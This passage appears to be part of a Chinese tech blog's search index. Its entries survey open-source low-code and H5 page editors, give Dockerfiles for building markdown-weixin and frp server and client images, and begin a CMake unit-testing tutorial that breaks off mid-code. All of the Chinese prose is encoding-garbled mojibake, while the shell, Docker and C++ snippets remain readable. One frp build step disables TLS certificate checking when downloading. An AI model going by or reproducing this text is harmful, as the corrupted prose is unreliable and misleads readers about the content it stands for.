è…¾è®¯äº‘è…¾è®¯äº‘åˆ™æ˜¯æ¨å‡ºäº†å¾®æ­ï¼Œé€šè¿‡è¡Œä¸šåŒ–æ¨¡æ¿ã€æ‹–æ”¾å¼ç»„ä»¶å’Œå¯è§†åŒ–é…ç½®å¿«é€Ÿæ„å»ºå¤šç«¯åº”ç”¨ï¼ˆå°ç¨‹åºã€H5 åº”ç”¨ã€Web åº”ç”¨ç­‰ï¼‰ï¼Œæ‰“é€šäº†å°ç¨‹åºã€äº‘å‡½æ•°ã€‚ å¼€æºçš„ä½ä»£ç å¹³å°åŸºç¡€å¹³å°amisæç¤º amis GitHub ä»“åº“ amis å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ amis æ˜¯ä¸€ä¸ªä½ä»£ç å‰ç«¯æ¡†æ¶ï¼Œå®ƒä½¿ç”¨ JSON é…ç½®æ¥ç”Ÿæˆé¡µé¢ï¼Œå¯ä»¥å‡å°‘é¡µé¢å¼€å‘å·¥ä½œé‡ï¼Œæå¤§æå‡æ•ˆç‡ï¼Œç”±ç™¾åº¦å›¢é˜Ÿå¼€æºã€‚ ç”¨ JSON å†™é¡µé¢çš„å¥½å¤„ ä¸ºäº†å®ç°ç”¨æœ€ç®€å•æ–¹å¼æ¥ç”Ÿæˆå¤§éƒ¨åˆ†é¡µé¢ï¼Œamis çš„è§£å†³æ–¹æ¡ˆæ˜¯åŸºäº JSON æ¥é…ç½®ï¼Œå®ƒçš„ç‹¬ç‰¹å¥½å¤„æ˜¯ï¼š ä¸éœ€è¦æ‡‚å‰ç«¯ï¼šåœ¨ç™¾åº¦å†…éƒ¨ï¼Œå¤§éƒ¨åˆ† amis ç”¨æˆ·ä¹‹å‰ä»æ¥æ²¡å†™è¿‡å‰ç«¯é¡µé¢ï¼Œä¹Ÿä¸ä¼š JavaScriptï¼Œå´èƒ½åšå‡ºä¸“ä¸šä¸”å¤æ‚çš„åå°ç•Œé¢ï¼Œè¿™æ˜¯æ‰€æœ‰å…¶ä»–å‰ç«¯ UI åº“éƒ½æ— æ³•åšåˆ°çš„ï¼› ä¸å—å‰ç«¯æŠ€æœ¯æ›´æ–°çš„å½±å“ï¼šç™¾åº¦å†…éƒ¨æœ€è€çš„ amis é¡µé¢æ˜¯ 6 å¹´å¤šå‰åˆ›å»ºçš„ï¼Œè‡³ä»Šè¿˜åœ¨ä½¿ç”¨ï¼Œè€Œå½“å¹´çš„ Angular/Vue/React ç‰ˆæœ¬ç°åœ¨éƒ½åºŸå¼ƒäº†ï¼Œå½“å¹´æµè¡Œçš„ Gulp ä¹Ÿè¢« Webpack å–ä»£äº†ï¼Œå¦‚æœè¿™äº›é¡µé¢ä¸æ˜¯ç”¨ amisï¼Œç°åœ¨çš„ç»´æŠ¤æˆæœ¬ä¼šå¾ˆé«˜ï¼› äº«å— amis çš„ä¸æ–­å‡çº§ï¼šamis ä¸€ç›´åœ¨æå‡ç»†èŠ‚äº¤äº’ä½“éªŒï¼Œæ¯”å¦‚è¡¨æ ¼é¦–è¡Œå†»ç»“ã€ä¸‹æ‹‰æ¡†å¤§æ•°æ®ä¸‹ä¸å¡é¡¿ç­‰ï¼Œä¹‹å‰çš„ JSON é…ç½®å®Œå…¨ä¸éœ€è¦ä¿®æ”¹ï¼› å¯ä»¥å®Œå…¨ä½¿ç”¨ å¯è§†åŒ–é¡µé¢ç¼–è¾‘å™¨ æ¥åˆ¶ä½œé¡µé¢ï¼›ä¸€èˆ¬å‰ç«¯å¯è§†åŒ–ç¼–è¾‘å™¨åªèƒ½ç”¨æ¥åšé™æ€åŸå‹ï¼Œè€Œ amis å¯è§†åŒ–ç¼–è¾‘å™¨åšå‡ºçš„é¡µé¢æ˜¯å¯ä»¥ç›´æ¥ä¸Šçº¿çš„ã€‚ amis çš„å…¶å®ƒäº®ç‚¹ æä¾›å®Œæ•´çš„ç•Œé¢è§£å†³æ–¹æ¡ˆï¼šå…¶å®ƒ UI æ¡†æ¶å¿…é¡»ä½¿ç”¨ JavaScript æ¥ç»„è£…ä¸šåŠ¡é€»è¾‘ï¼Œè€Œ amis åªéœ€ JSON é…ç½®å°±èƒ½å®Œæˆå®Œæ•´åŠŸèƒ½å¼€å‘ï¼ŒåŒ…æ‹¬æ•°æ®è·å–ã€è¡¨å•æäº¤åŠéªŒè¯ç­‰åŠŸèƒ½ï¼Œåšå‡ºæ¥çš„é¡µé¢ä¸éœ€è¦ç»è¿‡äºŒæ¬¡å¼€å‘å°±èƒ½ç›´æ¥ä¸Šçº¿ï¼› å¤§é‡å†…ç½®ç»„ä»¶ï¼ˆ120+ï¼‰ï¼Œä¸€ç«™å¼è§£å†³ï¼šå…¶å®ƒ UI æ¡†æ¶å¤§éƒ¨åˆ†éƒ½åªæœ‰æœ€é€šç”¨çš„ç»„ä»¶ï¼Œå¦‚æœé‡åˆ°ä¸€äº›ç¨å¾®ä¸å¸¸ç”¨çš„ç»„ä»¶å°±å¾—è‡ªå·±æ‰¾ç¬¬ä¸‰æ–¹ï¼Œè€Œè¿™äº›ç¬¬ä¸‰æ–¹ç»„ä»¶å¾€å¾€åœ¨å±•ç°å’Œäº¤äº’ä¸Šä¸ä¸€è‡´ï¼Œæ•´åˆèµ·æ¥æ•ˆæœä¸å¥½ï¼Œè€Œ amis åˆ™å†…ç½®å¤§é‡ç»„ä»¶ï¼ŒåŒ…æ‹¬äº†å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ã€ä»£ç ç¼–è¾‘å™¨ã€diffã€æ¡ä»¶ç»„åˆã€å®æ—¶æ—¥å¿—ç­‰ä¸šåŠ¡ç»„ä»¶ï¼Œç»å¤§éƒ¨åˆ†ä¸­åå°é¡µé¢å¼€å‘åªéœ€è¦äº†è§£ amis å°±è¶³å¤Ÿäº†ï¼› æ”¯æŒæ‰©å±•ï¼šé™¤äº†ä½ä»£ç æ¨¡å¼ï¼Œè¿˜å¯ä»¥é€šè¿‡ è‡ªå®šä¹‰ç»„ä»¶ æ¥æ‰©å……ç»„ä»¶ï¼Œå®é™…ä¸Š amis å¯ä»¥å½“æˆæ™®é€š UI åº“æ¥ä½¿ç”¨ï¼Œå®ç° 90% ä½ä»£ç ï¼Œ10% ä»£ç å¼€å‘çš„æ··åˆæ¨¡å¼ï¼Œæ—¢æå‡äº†æ•ˆç‡ï¼Œåˆä¸å¤±çµæ´»æ€§ï¼› å®¹å™¨æ”¯æŒæ— é™çº§åµŒå¥—ï¼šå¯ä»¥é€šè¿‡åµŒå¥—æ¥æ»¡è¶³å„ç§å¸ƒå±€åŠå±•ç°éœ€æ±‚ï¼› ç»å†äº†é•¿æ—¶é—´çš„å®æˆ˜è€ƒéªŒï¼šamis åœ¨ç™¾åº¦å†…éƒ¨å¾—åˆ°äº†å¹¿æ³›ä½¿ç”¨ï¼Œåœ¨ 6 å¹´å¤šçš„æ—¶é—´é‡Œåˆ›å»ºäº† 5 ä¸‡é¡µé¢ï¼Œä»å†…å®¹å®¡æ ¸åˆ°æœºå™¨ç®¡ç†ï¼Œä»æ•°æ®åˆ†æåˆ°æ¨¡å‹è®­ç»ƒï¼Œamis æ»¡è¶³äº†å„ç§å„æ ·çš„é¡µé¢éœ€æ±‚ï¼Œæœ€å¤æ‚çš„é¡µé¢æœ‰è¶…è¿‡ 1 ä¸‡è¡Œ JSON é…ç½®ã€‚ amis ä¸é€‚åˆåšä»€ä¹ˆ ä½¿ç”¨ JSON æœ‰ä¼˜ç‚¹ä½†ä¹Ÿæœ‰æ˜æ˜¾ç¼ºç‚¹ï¼Œåœ¨ä»¥ä¸‹åœºåˆå¹¶ä¸é€‚åˆ amisï¼š å¤§é‡å®šåˆ¶ UIï¼šJSON é…ç½®ä½¿å¾— amis æ›´é€‚åˆåšæœ‰å¤§é‡å¸¸è§ UI ç»„ä»¶çš„é¡µé¢ï¼Œä½†å¯¹äºé¢å‘æ™®é€šå®¢æˆ·ï¼ˆtoCï¼‰çš„é¡µé¢ï¼Œå¾€å¾€è¿½æ±‚ä¸ªæ€§åŒ–çš„è§†è§‰æ•ˆæœï¼Œè¿™ç§æƒ…å†µä¸‹ç”¨ amis å°±ä¸åˆé€‚ï¼Œå®é™…ä¸Šç»å¤§éƒ¨åˆ†å‰ç«¯ UI ç»„ä»¶åº“ä¹Ÿéƒ½ä¸é€‚åˆï¼Œåªèƒ½å®šåˆ¶å¼€å‘ã€‚ æä¸ºå¤æ‚æˆ–ç‰¹æ®Šçš„äº¤äº’ï¼š æœ‰äº›å¤æ‚çš„å‰ç«¯åŠŸèƒ½ï¼Œæ¯”å¦‚ å¯è§†åŒ–ç¼–è¾‘å™¨ï¼Œå…¶ä¸­æœ‰å¤§é‡å®šåˆ¶çš„æ‹–æ‹½æ“ä½œï¼Œè¿™ç§éœ€è¦ä¾èµ–åŸç”Ÿ DOM å®ç°çš„åŠŸèƒ½æ— æ³•ä½¿ç”¨ amisã€‚ ä½†å¯¹äºæŸäº›äº¤äº’å›ºå®šçš„é¢†åŸŸï¼Œæ¯”å¦‚å›¾è¿çº¿ï¼Œamis åç»­ä¼šæœ‰ä¸“é—¨çš„ç»„ä»¶æ¥å®ç°ã€‚ mometaæç¤º mometa GitHub ä»“åº“ mometa æ˜¯ä¸€æ¬¾é¢å‘ç ”å‘çš„ä½ä»£ç å…ƒç¼–ç¨‹ï¼Œä»£ç å¯è§†ç¼–è¾‘ï¼Œè¾…åŠ©ç¼–ç å·¥å…·ã€‚ èƒŒæ™¯ mometa ä¸æ˜¯ä¼ ç»Ÿä¸»æµçš„ä½ä»£ç å¹³å°ï¼ˆå¦‚ amis / äº‘å‡¤è¶ï¼‰ï¼Œmometa æ˜¯é¢å‘ç ”å‘çš„ã€ä»£ç å¯è§†è®¾è®¡ç¼–è¾‘å¹³å°ï¼Œå®ƒæ›´åƒæ˜¯ dreamweaverã€gui å¯è§†ç¼–è¾‘ä¹‹äºç¨‹åºå‘˜ã€‚ ç‰¹æ€§ é¢å‘ç ”å‘çš„ä»£ç å¯è§†åŒ–ç¼–è¾‘ï¼Œç›´æ¥ä½œç”¨äºæºç  å“åº”å¼å¸ƒå±€ã€è·¯ç”±æ¨¡æ‹Ÿã€ç‰©æ–™é¢„è§ˆ åå‘å®šä½ï¼ˆè§†å›¾å®šä½æºç ï¼‰ æ‹–æ‹½æ’å…¥ç‰©æ–™ æ‹–æ‹½ç§»åŠ¨ ä¸Šä¸‹ç§»åŠ¨ åˆ é™¤ æ›¿æ¢ å±‚çº§é€‰æ‹© æ¥å…¥å‹å¥½ï¼ŒWebpack&gt;=4 æ’ä»¶åŒ–æ¥å…¥ å¼€å‘å‹å¥½ï¼Œç‰©æ–™åº“æ”¯æŒçƒ­æ›´æ–°ï¼Œä¸ç ´åå·²æœ‰å¼€å‘æ¨¡å¼ å¼€æ”¾ç‰©æ–™ç”Ÿæ€ï¼Œå¯å®šåˆ¶å›¢é˜Ÿå†…ç‰©æ–™åº“ï¼Œè§ mometa-mat å¤šè¯­è¨€ã€å¤šç”Ÿæ€æ”¯æŒï¼Œç›®å‰æš‚åªæ”¯æŒ Reactï¼Œåç»­æœ‰è®¡åˆ’æ”¯æŒ Vue è§£å†³çš„é—®é¢˜ å¯¹ä½ä»£ç å¹³å°ä¸å½¢æˆä¾èµ–ï¼ŒäºŒæ¬¡å¼€å‘å¯ä»¥æ— ç¼è¿›å…¥ä»£ç å¼€å‘æ¨¡å¼ åŒæ—¶æ”¯æŒæ‰€è§å³æ‰€å¾—çš„å¯è§†ç¼–è¾‘ï¼Œç”¨äºææ•ˆï¼Œæå‡å¼€å‘ä½“éªŒ æä¾›ç‰©æ–™ç”Ÿæ€ï¼Œå¯è‡ªå®šä¹‰ç‰©æ–™ï¼Œæå‡ç‰©æ–™ä½¿ç”¨ä½“éªŒï¼Œæå‡å¤ç”¨ç‡ mometa å®šä½æ›´å¤šæ˜¯åŸºäºç¨‹åºå‘˜æœ¬åœ°å¼€å‘çš„æ¨¡å¼ï¼Œæ–°å¢äº†å¯è§†åŒ–ç¼–ç çš„èƒ½åŠ›ï¼ˆä¿®æ”¹çš„ä¹Ÿæ˜¯æœ¬åœ°çš„ä»£ç æ–‡ä»¶æœ¬èº«ï¼‰ã€‚å®ƒæ›´åƒæ˜¯è¾…åŠ©ç¼–ç å·¥å…·ï¼Œè€Œä¸æ˜¯ No-Code (amis / äº‘å‡¤è¶) çš„å¹³å°æ–¹æ¡ˆã€‚ Sortableæç¤º Sortable GitHub ä»“åº“ Sortable æ˜¯ä¸€ä¸ªç”¨äºå¯é‡æ–°æ’åºçš„æ‹–æ”¾åˆ—è¡¨çš„ JavaScript åº“ï¼Œå¯å®ç°é€‚ç”¨äºç°ä»£æµè§ˆå™¨å’Œè§¦æ‘¸è®¾å¤‡çš„å¯é‡æ–°æ’åºçš„æ‹–æ”¾åˆ—è¡¨ï¼Œä¸éœ€è¦ä¾èµ– jQuery æˆ–æ¡†æ¶ã€‚ H5 å¼€å‘H5-Dooringæç¤º H5-Dooring GitHub ä»“åº“ H5-Dooring å®˜æ–¹ Wiki H5-Dooring æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§ï¼Œä¸“ä¸šå¯é çš„ H5 å¯è§†åŒ–é¡µé¢é…ç½®è§£å†³æ–¹æ¡ˆï¼Œè‡´åŠ›äºæä¾›ä¸€å¥—ç®€å•æ–¹ä¾¿ã€ä¸“ä¸šå¯é ã€æ— é™å¯èƒ½çš„ H5 è½åœ°é¡µæœ€ä½³å®è·µã€‚æŠ€æœ¯æ ˆä»¥ React å’Œ Typescript ä¸ºä¸»ï¼Œ åå°é‡‡ç”¨ Nodejs å¼€å‘ï¼Œæ­£åœ¨æ¢ç´¢ h5-lowcode è§£å†³æ–¹æ¡ˆã€‚ luban-h5æç¤º luban-h5 GitHub ä»“åº“ luban-h5 å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ luban-h5 åœ¨çº¿ Demo æ¼”ç¤º é²ç­ H5 æ˜¯åŸºäº Vue2.0 å¼€å‘ï¼Œé€šè¿‡æ‹–æ‹½å¿«é€Ÿç”Ÿæˆé¡µé¢çš„å¹³å°ï¼Œç±»ä¼¼ æ˜“ä¼ç§€ã€Makaã€ç™¾åº¦ H5 ç­‰å¹³å°ã€‚ quark-h5æç¤º quark-h5 GitHub ä»“åº“ quark-h5 æ˜¯ä¸€æ¬¾åŸºäº Vue2 + Koa2 çš„ H5 é¡µé¢å¯è§†åŒ–åˆ¶ä½œå·¥å…·ï¼Œè®©ä¸ä¼šå†™ä»£ç çš„äººä¹Ÿèƒ½è½»æ¾å¿«é€Ÿä¸Šæ‰‹åˆ¶ä½œ H5 é¡µé¢ã€‚ç±»ä¼¼æ˜“ä¼ç§€ã€ç™¾åº¦ H5 ç­‰ H5 åˆ¶ä½œã€å»ºç«™å·¥å…·ã€‚ å…¶ä»–å¼€æºé¡¹ç›® h5-factoryï¼šH5 é¡µé¢åˆ¶ä½œï¼Œç§»åŠ¨ç«¯ä¸“é¢˜æ´»åŠ¨é¡µé¢å¯è§†åŒ–ç¼–è¾‘ lz-h5-editï¼šéšå¿ƒç§€ï¼ˆReact ç‰ˆ H5 å¾®åœºæ™¯ç¼–è¾‘å™¨)ï¼Œä¸€æ¬¾ç±»ä¼¼æ˜“ä¼ç§€ã€å…”å±•çš„ H5 å¾®åœºæ™¯ç¼–è¾‘å™¨ vite-vue3-lowcodeï¼šç§»åŠ¨ç«¯ä½ä»£ç å¹³å°ï¼Œå®ç°äº†å¯è§†åŒ–æ‹–æ‹½ã€å¯è§†åŒ–ç¼–è¾‘å™¨ï¼Œç±»ä¼¼æ˜“ä¼ç§€çš„ H5 åˆ¶ä½œã€å»ºç«™å·¥å…·ã€å¯è§†åŒ–æ­å»ºå·¥å…·ï¼› å‚è€ƒåšå®¢ äº‘å‡¤è¶ä½ä»£ç ä¹‹è·¯ æ­å»ºè‡ªå·±çš„ä½ä»£ç å¹³å° äº‘å‡¤è¶å¯è§†åŒ–æ­å»ºçš„æ¨å¯¼ä¸å®ç° Vue + Koa ä»é›¶æ‰“é€ ä¸€ä¸ª H5 é¡µé¢å¯è§†åŒ–ç¼–è¾‘å™¨ - quark-h5 åŸºäº Koa2 æ‰“é€ å±äºè‡ªå·±çš„ MVC æ¡†æ¶ï¼Œä»¿ Egg çš„ç®€æ˜“ç‰ˆæœ¬ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€æº å‰ç«¯"},{title:"Markdown è½¬æ¢å¾®ä¿¡å…¬ä¼—å·æ–‡ç« å†…å®¹",url:"/posts/1c073f45.html",text:'å‰è¨€ä½¿ç”¨å¾®ä¿¡å…¬ä¼—å·ç¼–è¾‘å™¨æœ‰ä¸€ä¸ªååˆ†å¤´ç–¼çš„é—®é¢˜ â€”â€” ç²˜è´´å‡ºæ¥çš„ä»£ç ï¼Œæ ¼å¼é”™ä¹±ï¼Œè€Œä¸”ç‰¹åˆ«ä¸‘ã€‚markdown-weixin æ˜¯ä¸€æ¬¾è®© Markdown è½¬å¾®ä¿¡å…¬ä¼—å·å†…å®¹çš„ç¥å™¨ï¼Œèƒ½è®© Markdown å†…å®¹ï¼Œæ— éœ€ä½œä»»ä½•è°ƒæ•´å°±èƒ½ä¸€é”®å¤åˆ¶åˆ°å¾®ä¿¡å…¬ä¼—å·ä½¿ç”¨ï¼Œè€Œä¸”ç‰¹åˆ«é’ˆå¯¹ä»£ç å±•ç¤ºåšäº†ä¼˜åŒ–ã€‚ é¡¹ç›®æ„å»º1234567891011121314# æ‹‰å–æºä»£ç $ git clone https://github.com/rqh656418510/markdown-weixin.git# è¿›å…¥æºä»£ç ç›®å½•$ cd markdown-weixin# å®‰è£…ä¾èµ–$ npm install# æ„å»ºé¡¹ç›®$ npm run build# æŸ¥çœ‹æ„å»ºç”Ÿæˆçš„æ–‡ä»¶ï¼ˆdocsç›®å½•å¯ç›´æ¥éƒ¨ç½²åˆ°WebæœåŠ¡å™¨ï¼‰$ ls -al docs æ¼”ç¤ºæ•ˆæœæç¤º markdown-weixin çš„ åœ¨çº¿ä½¿ç”¨åœ°å€ markdown-weixin çš„ GitHub ä»“åº“åœ°å€ ä½¿ç”¨ Docker12345# æ„å»ºé•œåƒ# docker build -f Dockerfile -t clay/markdown-weixin:latest .# å¯åŠ¨å®¹å™¨# docker run -d -p 8080:80 clay/markdown-weixin:latest Docker å®¹å™¨è¿è¡Œèµ·æ¥ä¹‹åï¼Œæ‰“å¼€æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080 å³å¯ï¼Œå®Œæ•´çš„ Dockerfileï¼ˆåŸºäº Debian 9 + Tengineï¼‰ å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879FROM node:14-stretchMAINTAINER clay&lt;clay@gmail.com&gt;# åˆ›å»ºç”¨æˆ·RUN groupadd tengine &amp;&amp; useradd -g tengine tengine# æ›´æ¢è½¯ä»¶æºRUN cp /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# å®‰è£…ä¾èµ–RUN apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ apt-get -y install vim tree htop apt-utils net-tools telnet wget curl &amp;&amp; \\ apt-get -y install autoconf git build-essential libpcre3 libpcre3-dev zlib1g zlib1g.dev openssl libssl-dev &amp;&amp; \\ apt-get -y autoclean &amp;&amp; apt-get -y autoremove# å®šä¹‰Tengineçš„ç‰ˆæœ¬å·ENV VERSION 2.2.3# ä¸‹è½½å¹¶è§£å‹æ–‡ä»¶RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# åˆ›å»ºå®‰è£…ç›®å½•ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# è¿›å…¥è§£å‹ç›®å½•WORKDIR /usr/local/src/tengine-$VERSION# ç¼–è¯‘å®‰è£…RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module \\ &amp;&amp; make \\ &amp;&amp; make install# è®¾ç½®ç¯å¢ƒå˜é‡ENV PATH $PATH:$TENGINE_HOME/sbin# å®šä¹‰APPç›®å½•ENV APP_HOME $TENGINE_HOME/html# ç¼–è¯‘APPé¡¹ç›®RUN mkdir -p /tmp/markdown-weixin \\ &amp;&amp; git clone https://github.com/rqh656418510/markdown-weixin /tmp/markdown-weixin \\ &amp;&amp; cd /tmp/markdown-weixin \\ &amp;&amp; npm config set registry https://registry.npm.taobao.org \\ &amp;&amp; npm install \\ &amp;&amp; npm run build# æ‹·è´APPé¡¹ç›®ç¼–è¯‘åçš„æ–‡ä»¶RUN mkdir -p $APP_HOME \\ &amp;&amp; rm -rf $APP_HOME/* \\ &amp;&amp; cp -R -rf /tmp/markdown-weixin/docs/* $APP_HOME# æ¸…ç†æ–‡ä»¶RUN rm -rf /usr/local/src &amp;&amp; rm -rf /tmp/markdown-weixin# è®¾ç½®é»˜è®¤å·¥ä½œç›®å½•WORKDIR $APP_HOME# æš´éœ²ç«¯å£EXPOSE 80EXPOSE 443CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢ å‰ç«¯"},{title:"Docker æ„å»º Frp é•œåƒ",url:"/posts/8285186a.html",text:'å‰è¨€ Frp å®˜æ–¹æ–‡æ¡£ Frp GitHub é¡¹ç›® Frp Docker GitHub é¡¹ç›® æ„å»º Frps é•œåƒ Dockerfile ç¼–å†™ 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frps /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frps.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frps -c /etc/frp/frps.ini æ„å»ºé•œåƒ 1# docker build -f Dockerfile -t clay/frps:0.38.0 . å¯åŠ¨é•œåƒ 1# docker run --restart=always --network host -d -v /etc/frp/frps.ini:/etc/frp/frps.ini --name frps clay/frps æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ 1# docker logs -f --tail 20 frps æ„å»º Frpc é•œåƒ Dockerfile ç¼–å†™ 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frpc /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frpc.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frpc -c /etc/frp/frpc.ini æ„å»ºé•œåƒ 1# docker build -f Dockerfile -t clay/frpc:0.38.0 . å¯åŠ¨é•œåƒ 1# docker run --restart=always --network host -d -v /etc/frp/frpc.ini:/etc/frp/frpc.ini --name frpc clay/frpc æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ 1# docker logs -f --tail 20 frpc var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"CMake å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰å•å…ƒæµ‹è¯•",url:"/posts/52f22f9b.html",text:'å‰è¨€CMake æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„ C/C++ é¡¹ç›®ç»„ç»‡ç®¡ç†å·¥å…·ï¼Œè™½ç„¶è®¸å¤š IDE éƒ½æœ‰ç§æœ‰çš„é¡¹ç›®ç®¡ç†å·¥å…·ï¼Œä½†æ˜¯åœ¨ç°åœ¨å„å¤§ IDE åŸºæœ¬éƒ½æ”¯æŒä½¿ç”¨ CMake ç®¡ç†é¡¹ç›®ï¼Œæ‰€ä»¥å¦‚æœæœ‰è·¨å¹³å°çš„éœ€æ±‚ï¼Œä½¿ç”¨ CMake ç®¡ç†æ˜¯æœ€æ–¹ä¾¿çš„ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒCMake æ”¯æŒ gtestã€cppunit ç­‰å•å…ƒæµ‹è¯•æ¡†æ¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨æ–­è¨€è‡ªå®šä¹‰å•å…ƒæµ‹è¯•ã€‚ åˆ›å»ºç®€å•çš„å¸¦å•å…ƒæµ‹è¯•çš„é¡¹ç›®åˆ›å»ºé¡¹ç›®å·¥ç¨‹ä¸‹è½½ä»£ç  ç‚¹å‡»ä¸‹è½½ å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼Œé¡¹ç›®çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 12345678910111213minder-testâ”œâ”€â”€ CMakeLists.txtâ”œâ”€â”€ includeâ”‚ â””â”€â”€ datetime.hâ”œâ”€â”€ srcâ”‚ â”œâ”€â”€ datetime.cppâ”‚ â””â”€â”€ main.cppâ””â”€â”€ test â”œâ”€â”€ CMakeLists.txt â”œâ”€â”€ include â”‚ â””â”€â”€ strUtil.h â””â”€â”€ src â””â”€â”€ main.cpp ç¼–å†™é¡¹ç›®ä»£ç  include/datetime.h 1234567891011121314151617181920#pragma once#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// æ—¥æœŸå·¥å…·ç±»class DateUtil {public: static string formatCurrentTime(); static string formatCurrentTime(string format); static int dayOfWeek(const string &amp;date); static bool isWeekendDays(const string &amp;date);}; src/datetime.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include "datetime.h"// æ ¼å¼åŒ–å½“å‰æ—¶é—´// é»˜è®¤æ ¼å¼æ˜¯: 2020-06-07 23:46:53string DateUtil::formatCurrentTime() { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// æ ¼å¼åŒ–å½“å‰æ—¶é—´// format: æ ¼å¼å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ %Y-%m-%d %H:%M:%Sstring DateUtil::formatCurrentTime(string format) { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info 